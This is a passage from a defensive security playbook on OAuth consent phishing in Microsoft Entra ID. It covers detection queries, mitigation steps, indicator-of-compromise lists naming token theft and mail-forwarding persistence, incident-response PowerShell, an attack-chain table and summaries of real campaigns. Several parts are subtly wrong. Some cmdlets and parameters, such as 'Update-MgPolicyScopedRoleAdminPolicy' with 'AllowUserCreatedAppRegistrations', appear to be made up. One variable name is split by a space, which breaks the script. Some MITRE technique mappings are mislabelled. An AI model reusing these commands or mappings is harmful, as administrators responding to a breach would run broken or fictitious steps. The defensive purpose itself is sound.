$auditData | ForEach-Object {
  $data = $_ | ConvertFrom-Json
  Write-Host "[*] $($_.UserIds) granted consent to $($data.TargetResources[0].DisplayName) at $($_.CreatedDate)"
}
```

**What to Look For:**

- **Consent to application** events with suspicious app names (helpers, integrations, sync tools).
- **Add OAuth2PermissionGrant** with broad scopes (Mail.ReadWrite, Directory.ReadWrite.All).
- **Add application** events by non-developer users (suspicious if user has no history of app creation).
- Rapid succession of consent grants (indicator of compromise).

---

## 9. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**1. Block User Consent for Non-Verified Applications**

This is the primary mitigation. By default, prevent users from consenting to apps without verified publishers.

**Manual Steps (Azure Portal):**

1. Navigate to **Azure Portal** → **Entra ID** → **Enterprise applications** → **Consent and permissions** → **User consent settings**
2. Under **User consent for applications**, select **Do not allow user consent**
3. **Exception:** (Optional) Select **Allow user consent for apps from verified publishers for selected permissions**
4. Choose which permissions users can consent to (e.g., only low-risk: profile, email, openid)
5. Click **Save**

**Manual Steps (PowerShell):**

```powershell
Connect-MgGraph -Scopes "Policy.ReadWrite.Authorization"

# Disable user consent
Update-MgPolicyScopedRoleAdminPolicy `
  -IsEnabled $false `
  -PermissionGrantPolicies @("default-user-consent-policy")

# Alternative: Block all except verified publishers
$params = @{
    id = "4d3e6e09-ba7c-4e0f-aaa0-aa4c42f6d2a5"
    definition = @("BlockUserConsentForNonVerifiedApps")
}

Update-MgPolicyScopedRoleAdminPolicy -BodyParameter $params
```

**What This Does:**

- Blocks users from granting consent to any application (including external ones).
- Requires admin approval for all consent requests.
- Reduces attack surface significantly.

**Impact:**

- Users cannot install third-party productivity apps without IT approval.
- May reduce user productivity but drastically improves security.

---

**2. Enable Risk-Based Step-Up Consent (Default in 2025)**

Microsoft has enabled this by default starting July 2025. Automatically blocks risky consent requests.

**Manual Steps (Azure Portal - Verification):**

1. Navigate to **Entra ID** → **Enterprise applications** → **Consent and permissions** → **User consent settings**
2. Verify **"Risk-based step-up consent"** is **Enabled** (should be default)
3. This automatically requires admin approval when users attempt to consent to:
   - Multi-tenant apps without verified publishers
   - Apps requesting access to emails, files, or admin resources
   - Apps with suspicious properties

**What This Does:**

- Automatically detects risky consent requests (no verified publisher, suspicious permissions).
- Requires admin approval instead of allowing user consent.
- Blocks device code phishing and many consent phishing variants.

---

**3. Restrict User Permissions to Create Applications**

By default, all users can create applications in Entra ID. Restrict this to admins only.

**Manual Steps (Azure Portal):**

1. Navigate to **Entra ID** → **User settings** → **App registrations**
2. Set **Users can register applications** to **No**
3. Only admins (or designated developer users) can now create apps
4. Click **Save**

**Manual Steps (PowerShell):**

```powershell
Connect-MgGraph -Scopes "Directory.ReadWrite.All"

# Disable app creation for regular users
Update-MgPolicyScopedRoleAdminPolicy `
  -AllowUserCreatedAppRegistrations $false
```

**What This Does:**

- Prevents compromised user accounts from creating malicious apps internally.
- Raises the bar for internal OAuth phishing attacks (METHOD 2).

**Impact:**

- Developers need to request admin approval to create apps.
- Reduces risk of insider threats or compromised accounts registering apps.

---

### Priority 2: HIGH

**4. Require Admin Consent for Office 365 Graph Scopes**

Prevent users from granting access to sensitive Microsoft Graph scopes without admin approval.

**Manual Steps (Azure Portal):**

1. Navigate to **Entra ID** → **Enterprise applications** → **Consent and permissions** → **Consent request settings** (if available)
2. Create a custom **app consent policy** that requires admin approval for sensitive scopes:
   - Mail.Read, Mail.ReadWrite
   - Files.Read, Files.ReadWrite
   - Calendars.Read, Calendars.ReadWrite
   - Directory.Read.All, Directory.ReadWrite.All
3. Save the policy

**Manual Steps (PowerShell):**

```powershell
# Create custom app consent policy
$params = @{
    DisplayName = "Block High-Risk OAuth Scopes"
    Description = "Requires admin approval for Mail.Read, Files.Read, offline_access"
    Restrictions = @{
        Permissions = @{
            ResourceApplicationId = "00000003-0000-0000-c000-000000000000"
            PermissionIds = @(
                "e1fe6dd8-ba31-4d61-89e7-88639da4683d",  # Mail.Read
                "37f7f235-527c-4136-accd-4a02d197296e"   # offline_access
            )
        }
    }
}

New-MgIdentityAppConsentPolicy -BodyParameter $params
```

---

**5. Monitor and Audit OAuth Application Permissions**

Regularly review which applications have been granted consent.

**PowerShell Command (Monthly Audit):**

```powershell
# Export all OAuth permission grants
Get-MgOauth2PermissionGrant -All | `
  Select-Object ClientAppDisplayName, ResourceDisplayName, Scope, CreatedDateTime | `
  Where-Object { $_.CreatedDateTime -gt (Get-Date).AddMonths(-1) } | `
  Export-Csv -Path "C:\Audit\oauth_permissions_$(Get-Date -Format 'yyyy-MM-dd').csv"

# Identify high-risk permissions
Get-MgOauth2PermissionGrant -All | `
  Where-Object { $_.Scope -like "*Mail*" -or $_.Scope -like "*Files*" -or $_.Scope -like "*offline*" } | `
  Select-Object ClientAppDisplayName, Scope | `
  Format-Table
```

---

**6. Configure Conditional Access Policies for OAuth Apps**

Use Conditional Access to restrict OAuth app usage based on device compliance, location, and other risk factors.

**Manual Steps (Azure Portal):**

1. Navigate to **Entra ID** → **Security** → **Conditional Access**
2. Click **+ New policy**
3. **Name:** `Restrict High-Risk OAuth Apps`
4. **Assignments:**
   - **Users:** All users
   - **Cloud apps:** Select specific apps (or "All cloud apps")
5. **Conditions:**
   - **Client apps:** Select "Mobile apps and desktop clients" and "Other clients"
   - **Device platforms:** Windows, macOS, Linux (mobile should have lower access)
6. **Access controls:**
   - **Grant:** Require device to be marked as compliant OR Require MFA
7. **Enable policy:** On
8. Click **Create**

---

### Access Control & Policy Hardening

**7. Implement Verified Publisher Verification**

Encourage legitimate app developers to undergo Microsoft's verification process. Block unverified apps.

**Manual Steps:**

- Recommend partners/vendors to apply for [Publisher Verification](https://learn.microsoft.com/en-us/entra/identity-platform/publisher-verification-overview)
- This badge appears on consent screens, building user trust.
- Only accept apps from verified publishers in your organization.

---

**8. Enable Enhanced Logging and Monitoring**

Ensure all Entra ID and M365 audit logs are streamed to SIEM or Log Analytics for detection.

**Manual Steps (Azure Portal):**

1. Navigate to **Azure Monitor** → **Diagnostic settings** (for Entra ID)
2. Create a new diagnostic setting:
   - **Logs:** AuditLogs, SignInLogs, NonInteractiveUserSignInLogs, ServicePrincipalSignInLogs
   - **Destination:** Log Analytics workspace or Event Hub
3. Enable **Send to Log Analytics**
4. Create alerts for suspicious patterns (see Sentinel Detection section)

---

**Validation Command (Verify Mitigations):**

```powershell
# Check user consent settings
Get-MgPolicyScopedRoleAdminPolicy | Select-Object IsEnabled, PermissionGrantPolicies

# Check if user app registration is disabled
Get-MgPolicyScopedRoleAdminPolicy | Select-Object AllowUserCreatedAppRegistrations

# List all OAuth permission grants (should be minimal)
Get-MgOauth2PermissionGrant -All | Measure-Object
```

**Expected Output (If Secure):**

```
IsEnabled: False
AllowUserCreatedAppRegistrations: False
OAuth2PermissionGrant Count: < 10 (only approved apps)
```

---

## 10. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**Entra ID/M365 IOCs:**

- **Suspicious OAuth applications created** in the last 7 days with names like "Helper", "Integration", "Sync Tool", "SharePoint Manager".
- **Consent grants to non-verified publishers** for broad scopes (Mail.Read, Files.Read, offline_access).
- **Admin consent grants to external applications** (ConsentType == "AllPrincipals" to non-internal apps).
- **Rapid consent grants** (3+ grants by same user within 1 hour).
- **Refresh token usage patterns** indicative of automated token refresh (same IP, same app, 1-hour intervals).
- **Unusual Graph API activity** (bulk email downloads, massive file enumeration) from newly authorized apps.
- **Forwarding rules created** on Outlook inbox (attacker persistence via email forwarding).
- **New service principals created** with broad permissions (Directory.ReadWrite.All, Mail.ReadWrite).

**Email/Phishing IOCs:**

- **Phishing emails** with links to `login.microsoftonline.com` OAuth endpoints.
- **Emails referencing "consent", "permissions", "integration", "verification"** from unexpected senders.
- **Sender address spoofing** (display name mismatch with actual email address).
- **URL obfuscation** (bit.ly, tinyurl links that redirect to OAuth endpoints).

### Forensic Artifacts

**Cloud/Azure:**

- **Entra ID Sign-In Logs:** Records of successful authentications followed by OAuth app usage.
- **Audit Logs:** "Consent to application", "Add OAuth2PermissionGrant", "Add device" events with correlation IDs linking to compromise chain.
- **Graph Activity Logs:** Bulk email downloads, massive file enumeration, rapid API calls.
- **Unified Audit Log (M365):** "Consent to application", "Add OAuth2PermissionGrant", email forwarding rule creation.

**On-Premises (If Hybrid):**

- **Azure AD Sync logs:** If app was created during hybrid sync, logs in `C:\ProgramData\Aadconnect\trace` may show it.

### Response Procedures

**Immediate Actions (0-30 minutes):**

1. **Identify Compromised User:**

```powershell
# Find user who granted suspicious consent
$suspiciousConsent = Get-MgAuditLogDirectoryAudit -Filter "operationName eq 'Consent to application'" | `
  Where-Object { $_.CreatedDateTime -gt (Get-Date).AddHours(-1) }

$comprom ised User = $suspiciousConsent.InitiatedByUserPrincipalName

Write-Host "[!] Compromised user: $compromisedUser"
```

2. **Revoke User Sessions:**

```powershell
# Revoke all refresh tokens and active sessions
Revoke-AzureADUserAllRefreshToken -ObjectId (Get-MgUser -Filter "userPrincipalName eq '$compromisedUser'").Id

# Force re-authentication on next sign-in
Update-MgUser -UserId $compromisedUser -ForceChangePasswordNextSignIn $true
```

3. **Revoke OAuth Permissions:**

```powershell
# List all consents granted by compromised user
Get-MgOauth2PermissionGrant -All | `
  Where-Object { $_.PrincipalDisplayName -eq $compromisedUser } | `
  ForEach-Object { Remove-MgOauth2PermissionGrant -OAuth2PermissionGrantId $_.Id }
```

4. **Disable Malicious Application:**

```powershell
# Find the malicious app
$maliciousApp = Get-MgApplication -Filter "displayName eq 'SharePoint Integration Helper'"

if ($maliciousApp) {
    # Remove all OAuth grants for the app
    Get-MgOauth2PermissionGrant -All | `
      Where-Object { $_.ClientAppId -eq $maliciousApp.AppId } | `
      ForEach-Object { Remove-MgOauth2PermissionGrant -OAuth2PermissionGrantId $_.Id }
    
    # Delete the application
    Remove-MgApplication -ApplicationId $maliciousApp.Id
    Write-Host "[+] Malicious app deleted: $($maliciousApp.DisplayName)"
}
```

5. **Reset User Password:**

```powershell
$tempPassword = -join ((33..126) | Get-Random -Count 16 | ForEach-Object {[char]$_})

Update-MgUser -UserId $compromisedUser -PasswordProfile @{
    Password = $tempPassword
    ForceChangePasswordNextSignIn = $true
}

Write-Host "[+] Password reset. Temp password: $tempPassword (share via secure channel)"
```

**Containment (30 minutes - 2 hours):**

6. **Investigate Exfiltrated Data:**

```powershell
# Check what data was accessed via OAuth token
$auditData = Search-UnifiedAuditLog -UserIds "attacker@external.com" -StartDate (Get-Date).AddDays(-7) | `
  Where-Object { $_.Operations -like "*Mail*" -or $_.Operations -like "*OneDrive*" }

$auditData | Select-Object UserIds, Operations, CreatedDate | Format-Table

# Estimate data loss
$exfiltratedEmails = ($auditData | Where-Object { $_.Operations -eq "Get user mail items" }).Count
Write-Host "[!] Estimated exfiltrated emails: $exfiltratedEmails"
```

7. **Check for Lateral Movement:**

```powershell
# Search for phishing emails sent from compromised account
Get-MgUserMessage -UserId $compromisedUser -Filter "from/emailAddress/address eq '$compromisedUser'" | `
  Where-Object { $_.SentDateTime -gt (Get-Date).AddDays(-1) } | `
  Select-Object Subject, ReceivedDateTime, ToRecipients | `
  ForEach-Object {
    Write-Host "[!] Suspicious email: $($_.Subject) sent to $($_.ToRecipients.EmailAddress.Address)"
  }
```

8. **Check for Forwarding Rules:**

```powershell
# Check if attacker created email forwarding rules
Get-MgUserMailFolderMessageRule -UserId $compromisedUser | `
  Where-Object { $_.Actions -contains "ForwardAsAttachmentToRecipients" } | `
  Select-Object DisplayName, Actions | `
  ForEach-Object { Remove-MgUserMailFolderMessageRule -UserId $compromisedUser -RuleId $_.Id }
```

**Recovery (2-24 hours):**

9. **Threat Hunt for Similar Compromises:**

```powershell
# Find all users who granted consent in the past 7 days
$allConsents = Get-MgAuditLogDirectoryAudit -Filter "operationName eq 'Consent to application'" | `
  Where-Object { $_.CreatedDateTime -gt (Get-Date).AddDays(-7) }

# Identify users with unusual patterns (multiple consents, risky apps)
$allConsents | Group-Object InitiatedByUserPrincipalName | `
  Where-Object { $_.Count -gt 3 } | `
  ForEach-Object {
    Write-Host "[!] POTENTIAL COMPROMISE: $($_.Name) granted $($_.Count) consents"
  }
```

10. **Communicate Breach to Stakeholders:**

```
Subject: Security Incident: Unauthorized OAuth Access

We detected unauthorized access to your M365 account via malicious OAuth application.

IMMEDIATE ACTIONS TAKEN:
✓ All sessions revoked
✓ Password reset required on next sign-in
✓ Malicious application deleted
✓ OAuth permissions revoked

INVESTIGATION FINDINGS:
- Compromised user: alice@company.com
- Malicious app: SharePoint Integration Helper
- Data accessed: 45 emails, 12 files
- Persistence duration: ~3 days (Dec 20-23, 2025)

NEXT STEPS:
1. Use temporary password provided separately to sign in
2. Change password to a strong, unique one
3. Review email forwarding rules (Settings → Forwarding)
4. Enable Windows Hello for Business or security key
5. Do not access suspicious links or grant unexpected consents

Questions? Contact: security@company.com
```

---

## 11. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | **[IA-PHISH-002]** | **Consent Grant OAuth Phishing — attacker tricks user into granting OAuth permissions** |
| **2** | **Credential Access** | T1110 (Brute Force) | Attacker searches emails for passwords, credentials, admin details |
| **3** | **Persistence** | T1534 (Internal Phishing) | Attacker sends internal phishing from compromised account to other users |
| **4** | **Lateral Movement** | IA-PHISH-005 (Internal Spearphishing) | Attacker uses compromised account to target other high-value users |
| **5** | **Privilege Escalation** | T1098 (Account Manipulation) | If compromised user is admin, attacker grants malicious app tenant-wide permissions |
| **6** | **Impact** | T1537 (Transfer Data to Cloud Account) | Attacker exfiltrates emails, files, Teams messages, contacts |

---

## 12. REAL-WORLD EXAMPLES

### Example 1: Midnight Blizzard (APT29) - Microsoft Corporate Breach (Jan 2024)

**Attribution:** Russian SVR (Foreign Intelligence Service)

**Target:** Microsoft corporate environment

**Timeline:** Gained initial access in November 2023; detected January 2024

**Attack Methodology:**

1. **Initial Compromise:** Used password spray to compromise a legacy test account with elevated privileges.
2. **OAuth Application Creation:** Created multiple malicious OAuth applications within Microsoft's corporate Entra ID.
3. **Permission Escalation:** Granted the apps broad permissions (Mail.ReadWrite, Directory.ReadWrite.All).
4. **Persistence:** Created a new user account in Microsoft corporate environment and granted it consent to attacker-controlled apps.
5. **Legacy App Exploitation:** Identified and exploited a legacy test OAuth application already trusted by Microsoft.
6. **Exchange Access:** Used the app to gain full access to Exchange Online via `Office 365 Exchange Online full_access_as_app` role.
7. **Email Harvesting:** Downloaded executive emails for intelligence.

**Detected by:** Microsoft's EWS (Exchange Web Services) audit logs revealed unusual access patterns.

**Impact:**

- Access to Microsoft executives' emails
- Targeted intelligence collection on Microsoft's security roadmap
- Access to Microsoft's defensive tools and strategies

**References:**

- [Microsoft Midnight Blizzard Incident Report](https://www.microsoft.com/en-us/security/blog/2024/01/25/midnight-blizzard-guidance-for-responders-on-nation-state-attack/)

---

### Example 2: Tycoon 2FA Phishing Kit Campaign (Jan-Oct 2025)

**Attribution:** Criminal phishing-as-a-service (PhaaS) operators

**Target:** Organizations across all sectors; 3,000+ user accounts in 900+ M365 environments

**Timeline:** Active since early 2025; ongoing as of October 2025

**Attack Methodology:**

1. **Fake OAuth Apps:** Created 50+ malicious OAuth applications impersonating legitimate services (SharePoint, DocuSign, Adobe, RingCentral).
2. **Phishing Emails:** Sent spear-phishing emails to targets with subject lines like "Action Required: Update SharePoint Permissions".
3. **AiTM Chain:** Linked to adversary-in-the-middle (AiTM) phishing pages to harvest credentials and MFA codes.
4. **Persistent OAuth Access:** Once victim grants consent, attacker obtains refresh token and access token valid for months.
5. **Bulk Exfiltration:** Leveraged persistent tokens to download emails, files, and Teams messages at scale.

**Success Metrics:**

- **Success Rate:** 50%+
- **Targets:** 3,000+ accounts
- **Environments Affected:** 900+ M365 tenants
- **Infrastructure:** Shifted from Russia-based proxies to US-based data center hosting (April 2025) to evade detection

**Detection/Mitigation:**

- Proofpoint visibility into tenant infrastructure revealed 24+ malicious apps with consistent phishing patterns
- Microsoft updated default settings (July-August 2025) requiring admin consent for third-party apps, significantly impacting effectiveness

**References:**

- [Proofpoint - Tycoon 2FA OAuth Phishing Campaign](https://www.proofpoint.com/us/blog/threat-insight/microsoft-oauth-app-impersonation-campaign-leads-mfa-phishing)

---

### Example 3: UTA0352 (Storm-2372) - NGO Targeting Campaign (2024-2025)

**Attribution:** Russian state-backed threat group

**Target:** NGOs, government agencies, defense contractors, research institutions

**Timeline:** Active since 2024; continues into 2025

**Attack Methodology:**

1. **Social Engineering:** Contacted targets via Signal/WhatsApp, impersonating prominent individuals.
2. **Meeting Lure:** Invited targets to join video calls to discuss Ukraine conflict.
3. **OAuth Phishing:** Shared OAuth authorization links claiming required for video call participation.
4. **Token Theft:** Once victims entered device code or granted consent, attacker obtained tokens.
5. **Email Harvesting:** Used tokens to download emails via Graph API.
6. **Credential Extraction:** Searched for passwords, VPN credentials, admin details in emails.

**Detection:**

- Volexity security research identified the campaign
- Specific OAuth phishing URLs targeting multiple organizations simultaneously
- Refresh token usage patterns consistent with automated token polling

**Impact:**

- Compromise of critical NGO and government communications
- Access to sensitive correspondence related to Ukraine support and diplomacy
- Likely foreign intelligence collection operation

**References:**

- [Volexity - Phishing for Codes Research](https://www.volexity.com/blog/2025/02/13/multiple-russian-threat-actors-targeting-microsoft-device-code-authentication/)

---
